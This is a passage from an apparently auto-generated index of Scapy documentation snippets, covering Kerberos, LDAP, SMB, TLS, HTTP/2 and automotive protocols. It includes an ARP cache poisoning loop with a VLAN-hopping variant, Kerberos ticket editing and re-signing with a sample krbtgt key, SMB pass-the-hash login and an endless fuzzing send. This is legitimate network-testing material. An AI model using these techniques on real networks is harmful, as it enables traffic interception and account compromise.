python\nCODE:\n```\nsmbserver(\n    shares=[SMBShare(name=\"Scapy\", path=\"/tmp\")],\n    iface=\"eth0\",\n    ssp=NTLMSSP(\n        IDENTITIES={\n\n```\n\n----------------------------------------\n\nTITLE: Loading Ticketer Module and Basic Operations in Python\nDESCRIPTION: This snippet demonstrates how to load the Ticketer module, create a Ticketer object, open a ccache file, show tickets, edit a ticket, and resign it. It also shows how to decipher and re-inject a ticket.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.open_file(\"krb.ccache\")\n>>> t.show()\nTickets:\n1. Administrator@DOMAIN.LOCAL -> krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\n>>> t.edit_ticket(0)\nEnter the NT hash (AES-256) for this ticket (as hex): 6df5a9a90cb076f4d232a123d9c24f46ae11590a5430710bc1881dca337989ce\n>>> t.resign_ticket(0)\n>>> t.save()\n1660\n>>> # Other stuff you can do\n>>> tkt = t.dec_ticket(0)\n>>> tkt\n<EncTicketPart  flags=forwardable, proxiable, renewable, .........>\n>>> t.update_ticket(0, tkt)\n```\n\n----------------------------------------\n\nTITLE: Initializing SPNEGOSSP with Multiple SSPs in Python\nDESCRIPTION: Demonstrates how to create a SPNEGOSSP object that wraps multiple SSPs (NTLMSSP and KerberosSSP) for negotiation.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/gssapi.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.ntlm import *\nfrom scapy.layers.spnegossp import SPNEGOSSP\nclissp = SPNEGOSSP(\n    [\n        NTLMSSP(\n            UPN=\"Administrator@domain.local\",\n            PASSWORD=\"Password1!\",\n        ),\n        KerberosSSP(\n            UPN=\"Administrator@domain.local\",\n            PASSWORD=\"Password1!\",\n            SPN=\"host/dc1.domain.local\",\n        ),\n    ]\n)\n```\n\n----------------------------------------\n\nTITLE: Displaying Default HTTP Request Structure in Scapy\nDESCRIPTION: Shows the default structure of an HTTPRequest object in Scapy, including all available header fields that can be set when creating HTTP requests.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> HTTPRequest().show()\n###[ HTTP Request ]###\n  Method= 'GET'\n  Path= '/'\n  Http_Version= 'HTTP/1.1'\n  A_IM= None\n  Accept= None\n  Accept_Charset= None\n  Accept_Datetime= None\n  Accept_Encoding= None\n  [...]\n```\n\n----------------------------------------\n\nTITLE: Using a Custom Field in a Protocol Layer Definition in Python\nDESCRIPTION: This example demonstrates how to use a custom field type (VarLenQField) in the definition of a new protocol layer in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nclass FOO(Packet):\n    name = \"FOO\"\n    fields_desc = [ VarLenQField(\"len\", None, \"data\"),\n                    StrLenField(\"data\", \"\", length_from=lambda pkt: pkt.len) ]\n```\n\n----------------------------------------\n\nTITLE: Customizing SecOC Packets in Python\nDESCRIPTION: Class extension for SecOC_CANFD that implements three essential methods for SecOC functionality: retrieving the payload with SecOCDataID, providing the secret key, and managing freshness values.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\nclass My_SecOC_CANFD(SecOC_CANFD):\n\n    def get_secoc_payload(self) -> bytes:\n        \"\"\"\n        This method retrieves the payload, including the SecOCDataID,\n        which is used for MAC computation.\n        \"\"\"\n        secoc_data_id = self.identifier  # CANFD identifier\n        payload = self.pdu_payload\n        return bytes(secoc_data_id) + bytes(payload)\n\n    def get_secoc_key(self) -> bytes:\n        \"\"\"\n        This method provides the secret key for the specified SecOCDataID.\n        \"\"\"\n        secoc_data_id = self.identifier\n        secoc_key = GLOBAL_KEYS[secoc_data_id]\n        return secoc_key\n\n    def get_secoc_freshness_value(self) -> bytes:\n        \"\"\"\n        This method provides the full freshness value required for MAC computation.\n        \"\"\"\n        freshness_value = trip_count + reset_counter + message_count + self.tfv\n        return bytes(freshness_value)\n```\n\n----------------------------------------\n\nTITLE: Processing ClientHello Message\nDESCRIPTION: Reads and processes the ClientHello message from a raw file, creating a TLS session object.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook4_tls13.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n# ClientHello\nrecord1_str = open('raw_data/tls_session_13/01_cli.raw', 'rb').read()\nrecord1 = TLS(record1_str)\nsess = record1.tls_session\nrecord1.show()\n```\n\n----------------------------------------\n\nTITLE: Using Kernel's TCP Stack with Scapy StreamSocket in Python\nDESCRIPTION: This snippet demonstrates how to use Scapy's StreamSocket to wrap a standard Python socket, allowing it to be used with Scapy's sr() command family. It connects to a web server and sends a GET request.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tcp.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> s=socket.socket()\n>>> s.connect((\"www.test.com\",80))\n>>> ss=StreamSocket(s,Raw)\n>>> ss.sr1(Raw(\"GET /\\r\\n\"))\nBegin emission:\nFinished to send 1 packets.\n*\nReceived 1 packets, got 1 answers, remaining 0 packets\n<Raw  load='<html>\\r\\n<head> ... >\n```\n\n----------------------------------------\n\nTITLE: Fuzzing UDP and NTP Packets with Scapy\nDESCRIPTION: Shows how to use Scapy's fuzz() function to generate random values for UDP and NTP packet fields while keeping some fields constant. This is useful for creating fuzzing templates.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n>>> send(IP(dst=\"target\")/fuzz(UDP()/NTP(version=4)),loop=1)\n................^C\nSent 16 packets.\n```\n\n----------------------------------------\n\nTITLE: Changing Password using kpasswd in Set Mode with Scapy\nDESCRIPTION: This snippet demonstrates how to change a password using the kpasswd protocol in 'set' mode. This requires administrative privileges and uses a previously acquired TGT to authenticate the password change request.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n>>> t = Ticketer()\n>>> t.request_tgt(\"Administrator@domain.local\")\nEnter password: ************\n>>> t.kpasswdset(0, \"SERVER1$@domain.local\")\nINFO: Using 'Set Password' mode. This only works with admin privileges.\nEnter NEW password: ***********\n```\n\n----------------------------------------\n\nTITLE: ARP Cache Poisoning\nDESCRIPTION: Demonstrates ARP cache poisoning attacks including VLAN hopping variants.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\nsend( Ether(dst=clientMAC)/ARP(op=\"who-has\", psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1 )\n\nsend( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op=\"who-has\", psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1 )\n```\n\n----------------------------------------\n\nTITLE: Generating ED25519 SSL Certificate for Scapy Server\nDESCRIPTION: This code snippet demonstrates the process of creating an ED25519 SSL certificate for a Scapy test server. It generates a private key, creates a certificate signing request with specific extensions, signs the certificate using a CA, and then verifies the certificate contents.\nSOURCE: https://github.com/secdev/scapy/blob/master/test/scapy/layers/tls/pki/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nopenssl genpkey -algorithm ED25519 -out srv_key_ed25519.pem\nopenssl req -new -key srv_key_ed25519.pem -out srv_cert_ed25519.csr -addext basicConstraints=critical,CA:FALSE,pathlen:1 -addext \"extendedKeyUsage = serverAuth\" -subj \"/C=MN/L=Ulaanbaatar/OU=Scapy Test PKI/CN=Scapy Test Server\"\nopenssl x509 -req -days 3653 -in srv_cert_ed25519.csr -CA ca_cert.pem -CAkey ca_key.pem -out srv_cert_ed25519.pem -copy_extensions copyall\nrm srv_cert_ed25519.csr\nopenssl x509 -in srv_cert_ed25519.pem -text -noout\n```\n\n----------------------------------------\n\nTITLE: Modifying LDAP Attributes in Python with Scapy\nDESCRIPTION: Demonstrates how to change attributes on an LDAP object using a Modify Request, including replacing and adding attributes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/ldap.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nclient.modify(\n    \"CN=User1,CN=Users,DC=domain,DC=local\",\n    changes=[\n        LDAP_ModifyRequestChange(\n            operation=\"replace\",\n            modification=LDAP_PartialAttribute(\n                type=\"displayName\",\n                values=[\n                    LDAP_AttributeValue(value=\"Lord User the 1st\")\n                ]\n            )\n        ),\n        LDAP_ModifyRequestChange(\n            operation=\"add\",\n            modification=LDAP_PartialAttribute(\n                type=\"servicePrincipalName\",\n                values=[\n                    LDAP_AttributeValue(value=\"http/lorduser\")\n                ]\n            )\n        )\n    ]\n)\n```\n\n----------------------------------------\n\nTITLE: LDAP Binding with Various Mechanisms in Python using Scapy\nDESCRIPTION: Demonstrates different binding mechanisms including NONE, SIMPLE, SICILY (NTLM), SASL_GSSAPI (Kerberos), and SASL_GSS_SPNEGO (NTLM/Kerberos).\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/ldap.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nclient.bind(LDAP_BIND_MECHS.NONE)\n```\n\nLANGUAGE: python\nCODE:\n```\nclient.bind(\n    LDAP_BIND_MECHS.SIMPLE,\n    simple_username=\"Administrator\",\n    simple_password=\"Password1!\",\n)\n```\n\nLANGUAGE: python\nCODE:\n```\nssp = NTLMSSP(UPN=\"Administrator\", PASSWORD=\"Password1!\")\nclient.bind(\n    LDAP_BIND_MECHS.SICILY,\n    ssp=ssp,\n)\n```\n\nLANGUAGE: python\nCODE:\n```\nssp = KerberosSSP(UPN=\"Administrator@domain.local\", PASSWORD=\"Password1!\",\n                  SPN=\"ldap/dc1.domain.local\")\nclient.bind(\n    LDAP_BIND_MECHS.SASL_GSSAPI,\n    ssp=ssp,\n)\n```\n\nLANGUAGE: python\nCODE:\n```\nssp = SPNEGOSSP([\n    NTLMSSP(UPN=\"Administrator\", PASSWORD=\"Password1!\"),\n    KerberosSSP(UPN=\"Administrator@domain.local\", PASSWORD=\"Password1!\",\n                SPN=\"ldap/dc1.domain.local\"),\n])\nclient.bind(\n    LDAP_BIND_MECHS.SASL_GSS_SPNEGO,\n    ssp=ssp,\n)\n```\n\n----------------------------------------\n\nTITLE: Creating XCP Messages for TCP and UDP in Python\nDESCRIPTION: Shows how to create XCP messages for transmission over TCP and UDP protocols.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_17\n\nLANGUAGE: Python\nCODE:\n```\nprt1, prt2 = 12345, 54321\nXCPOnTCP(sport=prt1, dport=prt2) / CTORequest() / Connect()\n\nXCPOnUDP(sport=prt1, dport=prt2) / CTORequest() / Connect()\n```\n\n----------------------------------------\n\nTITLE: Using Kerberos Ticket as SSP for SMB Authentication in Scapy\nDESCRIPTION: This snippet demonstrates how to use a Kerberos ticket as a Security Support Provider (SSP) for authentication with an SMB client. It uses the ssp() method to convert a ticket to a usable SSP object.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> # We use ticket 1 from the above store.\n>>> smbclient(\"dc1.domain.local\", ssp=t.ssp(1))\n```\n\n----------------------------------------\n\nTITLE: SMB Client with NTLM Authentication\nDESCRIPTION: Shows how to connect to an SMB server using NTLM authentication with explicit credentials or hash.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> smbclient(\"server1.domain.local\", ssp=NTLMSSP(UPN=\"Administrator\", PASSWORD=\"password\"))\n\n>>> smbclient(\"server1.domain.local\", ssp=NTLMSSP(UPN=\"Administrator\", HASHNT=bytes.fromhex(\"8846f7eaee8fb117ad06bdd830b7586c\")))\n```\n\n----------------------------------------\n\nTITLE: Defining SignalPacket Fields for CAN Messages in Python\nDESCRIPTION: This snippet shows the definition of SignalPacket fields for a CAN message, including various types of SignalFields with different configurations.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nConditionalField(LESignedSignalField(\"muxSig5\", default=0, start=22, size=7, scaling=0.01), lambda p: p.myMuxer == 1),\nConditionalField(LEUnsignedSignalField(\"muxSig6\", default=0, start=32, size=9, scaling=2, offset=10, unit=\"mV\"), lambda p: p.myMuxer == 1),\nConditionalField(BESignedSignalField(\"muxSig7\", default=0, start=2, size=8, scaling=0.5), lambda p: p.myMuxer == 1),\nConditionalField(LESignedSignalField(\"muxSig8\", default=0, start=3, size=3, scaling=10), lambda p: p.myMuxer == 1),\nLESignedSignalField(\"muxSig9\", default=0, start=41, size=7, scaling=100, offset=-5, unit=\"V\"),\n```\n\n----------------------------------------\n\nTITLE: Parsing Server Final Messages\nDESCRIPTION: Parses the NewSessionTicket, ChangeCipherSpec, and Finished messages from server\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nrecord6_str = open('raw_data/tls_session_protected/06_srv.raw', 'rb').read()\nrecord6 = TLS(record6_str, tls_session=record5.tls_session.mirror())\nrecord6.show()\n```\n\n----------------------------------------\n\nTITLE: Scapy Libpcap Configuration\nDESCRIPTION: Code to enable libpcap integration in Scapy configuration.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.config import conf\nconf.use_pcap = True\n```\n\n----------------------------------------\n\nTITLE: Initializing Scapy TLS Environment\nDESCRIPTION: Sets up the Scapy environment by importing required modules, loading the TLS layer, and configuring logging level.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook4_tls13.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\nload_layer('tls')\nconf.logLevel = logging.INFO\n```\n\n----------------------------------------\n\nTITLE: HTTP/2 PING Frame Processing in Python with Scapy\nDESCRIPTION: Example of a HTTP/2 PING frame structure showing length, type, flags and stream ID fields. The frame has 8 bytes length and contains an opaque data field.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n###[ HTTP/2 Frame ]### \n  len       = 0x8\n  type      = PingFrm\n  flags     = set([])\n  reserved  = 0L\n  stream_id = 0L\n###[ HTTP/2 Ping Frame ]### \n     opaque    = 0\n```\n\n----------------------------------------\n\nTITLE: Initiating NTLM Security Context in Python\nDESCRIPTION: Demonstrates how to start the NTLM negotiation process by calling GSS_Init_sec_context and handling the initial token.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/gssapi.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nsspcontext, token, status = clissp.GSS_Init_sec_context(None, None)\nassert status == GSS_S_CONTINUE_NEEDED\n```\n\n----------------------------------------\n\nTITLE: Spawning DCERPC Server with Named Pipes Transport in Python using Scapy\nDESCRIPTION: This snippet demonstrates spawning a DCERPC server using Named Pipes transport with NTLMSSP authentication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.ntlm import NTLMSSP, MD4le\nssp = NTLMSSP(\n    IDENTITIES={\n        \"User1\": MD4le(\"Password\"),\n    }\n)\n\nMyRPCServer.spawn(\n    DCERPC_Transport.NCACN_NP,\n    ssp=ssp,\n    iface=\"eth0\",\n    port=445,\n    ndr64=True,\n)\n```\n\n----------------------------------------\n\nTITLE: Stacking Network Layers in Scapy\nDESCRIPTION: Demonstrates how to compose multiple network layers using the '/' operator in Scapy, including IP, TCP, Ether, and raw data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> IP()\n<IP |>\n>>> IP()/TCP()\n<IP frag=0 proto=TCP |<TCP |>>\n>>> Ether()/IP()/TCP()\n<Ether type=0x800 |<IP frag=0 proto=TCP |<TCP |>>>\n>>> IP()/TCP()/\"GET / HTTP/1.0\\r\\n\\r\\n\"\n<IP frag=0 proto=TCP |<TCP |<Raw load='GET / HTTP/1.0\\r\\n\\r\\n' |>>>\n>>> Ether()/IP()/IP()/UDP()\n<Ether type=0x800 |<IP frag=0 proto=IP |<IP frag=0 proto=UDP |<UDP |>>>>\n>>> IP(proto=55)/TCP()\n<IP frag=0 proto=55 |<TCP |>>\n```\n\n----------------------------------------\n\nTITLE: Sending DNS Query over TCP with StreamSocket in Scapy\nDESCRIPTION: This example shows how to use the DNSTCP layer with a StreamSocket to send a DNS query over TCP to a specific IP address and port.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\nimport socket\n\nsck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create an TCP socket\nsck.connect((\"8.8.8.8\", 53))  # connect to 8.8.8.8 on 53/TCP\n\n# Create the StreamSocket and gives the class used to decode the answer\nssck = StreamSocket(sck)\nssck.basecls = DNSTCP\n\n# Send the DNS query\nssck.sr1(DNSTCP(dns=DNS(rd=1, qd=DNSQR(qname=\"www.example.com\"))))\n```\n\n----------------------------------------\n\nTITLE: Parsing ServerHello Record\nDESCRIPTION: Reads and parses the ServerHello message from the TLS handshake\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nrecord2 = TLS(open('raw_data/tls_session_protected/02_srv.raw', 'rb').read())\nrecord2.show()\n```\n\n----------------------------------------\n\nTITLE: Scapy 3D Trace Example\nDESCRIPTION: Example of using VPython to create 3D traceroute visualizations.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> a,u=traceroute([\"www.python.org\", \"google.com\",\"slashdot.org\"])\n>>> a.trace3D()\n```\n\n----------------------------------------\n\nTITLE: Defining ASN.1 Classes in Python\nDESCRIPTION: Demonstrates how Scapy defines ASN.1 classes for Universal and context-specific (SNMP, X509) objects using inheritance.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nclass ASN1_Class_UNIVERSAL(ASN1_Class):\n    name = \"UNIVERSAL\"\n    # [...]\n    BOOLEAN = 1\n    INTEGER = 2\n    BIT_STRING = 3\n# [...]\n\nclass ASN1_Class_SNMP(ASN1_Class_UNIVERSAL):\n    name=\"SNMP\"\n    PDU_GET = 0xa0\n    PDU_NEXT = 0xa1\n    PDU_RESPONSE = 0xa2\n\nclass ASN1_Class_X509(ASN1_Class_UNIVERSAL):\n    name=\"X509\"\n    CONT0 = 0xa0\n    CONT1 = 0xa1\n# [...]\n```\n\n----------------------------------------\n\nTITLE: Creating HTTP/2 Frame with Priority for Favicon Request in Python\nDESCRIPTION: Constructs an HTTP/2 frame with priority information for the favicon request. It sets the stream dependency, weight, and exclusive flag to establish the request's priority relative to other streams.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nreal_qry_icon = h2.H2Frame(\n    stream_id=qry_icon.frames[0][h2.H2Frame].stream_id,\n    flags={'+'}.union(qry_icon.frames[0][h2.H2Frame].flags),\n) / h2.H2PriorityHeadersFrame(\n    hdrs=qry_icon.frames[0][h2.H2HeadersFrame].hdrs,\n    stream_dependency=1,\n    weight=32,\n    exclusive=0\n)\nreal_qry_icon.show()\n```\n\n----------------------------------------\n\nTITLE: Generating Kerberos AES256 Key from Password in Python\nDESCRIPTION: This code shows how to generate a Kerberos AES256 key using the string_to_key method of the Key class. It takes a password, salt (derived from the domain and username), and uses the AES256_CTS_HMAC_SHA1_96 encryption type.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n>>> from scapy.libs.rfc3961 import Key, EncryptionType\n>>> Key.string_to_key(EncryptionType.AES256_CTS_HMAC_SHA1_96, b\"Password1\", b\"DOMAIN.LOCALUser1\")\n>>> print(_.key)\nb'm\\x07H\\xc5F\\xf4\\xe9\\x92\\x05\\xe7\\x8f\\x8d\\xa7h\\x1dN\\xc5R\\n\\xe4\\x81UCr\\x0c*d|\\x1a\\xe8\\x14\\xc9'\n```\n\n----------------------------------------\n\nTITLE: Customizing UDS Packets for OEM-Specific Implementations\nDESCRIPTION: This example shows how to create custom UDS packet structures for OEM-specific implementations and bind them to existing UDS packets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_30\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.packet import Packet\nfrom scapy.contrib.automotive.uds import *\n\nclass DBI_IP(Packet):\n    name = 'DataByIdentifier_IP_Packet'\n    fields_desc = [\n        ByteField('ADDRESS_FORMAT_ID', 0),\n        IPField('IP', ''),\n        IPField('SUBNETMASK', ''),\n        IPField('DEFAULT_GATEWAY', '')\n    ]\n\nbind_layers(UDS_RDBIPR, DBI_IP, dataIdentifier=0x172b)\nbind_layers(UDS_WDBI, DBI_IP, dataIdentifier=0x172b)\n\nUDS_RDBI.dataIdentifiers[0x172b] = 'GatewayIP'\n```\n\n----------------------------------------\n\nTITLE: Defining String Fields in Scapy\nDESCRIPTION: Examples of string field types in Scapy, including fixed-length, null-terminated, and stop-field strings.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nStrField(name, default, fmt=\"H\", remain=0, shift=0)\nStrLenField(name, default, fld=None, length_from=None, shift=0):\nStrFixedLenField\nStrNullField\nStrStopField\n```\n\n----------------------------------------\n\nTITLE: Retrieving Interface MAC Address in Scapy\nDESCRIPTION: Demonstrates how to get the MAC address of a network interface using Scapy's get_if_hwaddr() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> mac = get_if_hwaddr(conf.iface)  # default interface\n>>> mac = get_if_hwaddr(\"eth0\")\n>>> mac\n'54:3f:19:c9:38:6d'\n```\n\n----------------------------------------\n\nTITLE: Parsing Application Data\nDESCRIPTION: Parses the final application data after TLS handshake completion\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nrecord7_str = open('raw_data/tls_session_protected/07_cli.raw', 'rb').read()\nrecord7 = TLS(record7_str, tls_session=record6.tls_session.mirror())\nrecord7.show()\n```\n\n----------------------------------------\n\nTITLE: Customizing Graph Visualization Settings\nDESCRIPTION: Configuration options for improving graph visualization output in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/troubleshooting.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> x.graph(format=\"png\")\n>>> x.graph(options=\"-Gdpi=70\")\n>>> conf.prog.dot = \"dot -Gdpi=70\"\n```\n\n----------------------------------------\n\nTITLE: Basic Packet Dissection Example in Python/Scapy\nDESCRIPTION: Example showing IP/TCP packet dissection with warnings about malformed headers\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\np=IP(\"A\"*20)/TCP(\"B\"*32)\nWARNING: bad dataofs (4). Assuming dataofs=5\n>>> p\n<IP  version=4L ihl=1L tos=0x41 len=16705 id=16705 flags=DF frag=321L ttl=65 proto=65 chksum=0x4141\nsrc=65.65.65.65 dst=65.65.65.65 |<TCP  sport=16962 dport=16962 seq=1111638594L ack=1111638594L dataofs=4L\nreserved=2L flags=SE window=16962 chksum=0x4242 urgptr=16962 options=[] |<Raw  load='BBBBBBBBBBBB' |>>>\n```\n\n----------------------------------------\n\nTITLE: Renewing Kerberos TGT and ST Tickets in Scapy\nDESCRIPTION: This code shows how to renew both a Ticket Granting Ticket (TGT) and a Service Ticket (ST) using the renew method. Note that ST renewal only works with 'host/' Service Principal Names.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> t.renew(0)  # renew TGT\n>>> t.renew(1)  # renew ST. Works only with 'host/' SPNs\n```\n\n----------------------------------------\n\nTITLE: Initializing Kerberos KRBTGT Key in Python with Scapy\nDESCRIPTION: This snippet shows how to initialize the KRBTGT key using the Key class from Scapy's RFC3961 library. It sets up the key with AES256 encryption type and a hexadecimal key value.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.libs.rfc3961 import Key, EncryptionType\nkrbtgt_hex = \"ac67a63d7155791fe31dace230ab516e818c453dfdbd44cbe691b240725c4907\"\nkrbtgt = Key(EncryptionType.AES256_CTS_HMAC_SHA1_96, key=bytes.fromhex(krbtgt_hex))\n```\n\n----------------------------------------\n\nTITLE: Using L3RawSocket for Local IPv4 Communication\nDESCRIPTION: Configuration to enable local IPv4 communication using L3RawSocket for ICMP ping on loopback interface.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/troubleshooting.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.L3socket\n<class __main__.L3PacketSocket at 0xb7bdf5fc>\n>>> conf.L3socket = L3RawSocket\n>>> sr1(IP() / ICMP())\n```\n\n----------------------------------------\n\nTITLE: Processing Application Data\nDESCRIPTION: Handles the application data exchange between client and server after the handshake is complete.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook4_tls13.ipynb#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n# Client application data\nrecord8_str = open('raw_data/tls_session_13/08_cli.raw', 'rb').read()\nrecord8 = TLS(record8_str, tls_session=sess)\nrecord8.show()\n```\n\nLANGUAGE: python\nCODE:\n```\n# Server application data\nrecord9_str = open('raw_data/tls_session_13/09_srv.raw', 'rb').read()\nrecord9 = TLS(record9_str, tls_session=sess.mirror())\nrecord9.show()\n```\n\n----------------------------------------\n\nTITLE: Retrieving Default Gateway in Scapy\nDESCRIPTION: Demonstrates how to obtain the default gateway IP address using Scapy's routing functionality.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> gw = conf.route.route(\"0.0.0.0\")[2]\n>>> gw\n'10.0.0.1'\n```\n\n----------------------------------------\n\nTITLE: Parsing HTTP/2 HPack Headers with Scapy\nDESCRIPTION: This snippet shows the structure of HPack headers in an HTTP/2 frame, including compressed header strings and indexed header fields. It demonstrates how Scapy represents these complex protocol structures.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\n###[ HPack Header String ]### \n  type      = Compressed\n  len       = 9\n  data      = 'HPackZString(SAMEORIGIN)'\n###[ HPack Literal Header With Incremental Indexing ]### \n  magic     = 1\n  index     = 55\n  \\hdr_value \\\n   |###[ HPack Header String ]### \n   |  type      = Compressed\n   |  len       = 165\n   |  data      = 'HPackZString(NID=91=Wt1Jkm3Eretgg-hJ32fkj7kSSOLTc8tfEEIP5F2QTzHqbsXcCFve-QoN1oZvkGEqqqAWklc2wlj97YDkMnGXQUw20iCYMc3FD6X-KVuK1wdFURafcqQMQZ8e-F14YUfn; expires=Wed, 14-Jun-2017 17:34:51 GMT; path=/; domain=.google.fr; HttpOnly)'\n###[ HPack Indexed Header Field ]### \n  magic     = 1\n  index     = 71\n```\n\n----------------------------------------\n\nTITLE: Initializing HTTP/2 Client Settings Frame with Scapy in Python\nDESCRIPTION: Begins creating an HTTP/2 settings frame to send client settings to the server, focusing on large values to avoid window management.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nown_set = h2.H2Frame()/h2.H2SettingsFrame()\nmax_frm_sz = (1 << 24) - 1\nmax_hdr_tbl_sz = (1 << 16) - 1\nwin_sz = (1 << 31) - 1\nown_set.settings = [\n    h2.H2Setting(id = h2.H2Setting.SETTINGS_ENABLE_PUSH, value=0),\n```\n\n----------------------------------------\n\nTITLE: Defining Automaton States and Actions in Python\nDESCRIPTION: This snippet demonstrates how to define states, conditions, and actions for a Scapy automaton using decorators. It shows the basic structure for creating an automaton class.\nSOURCE: 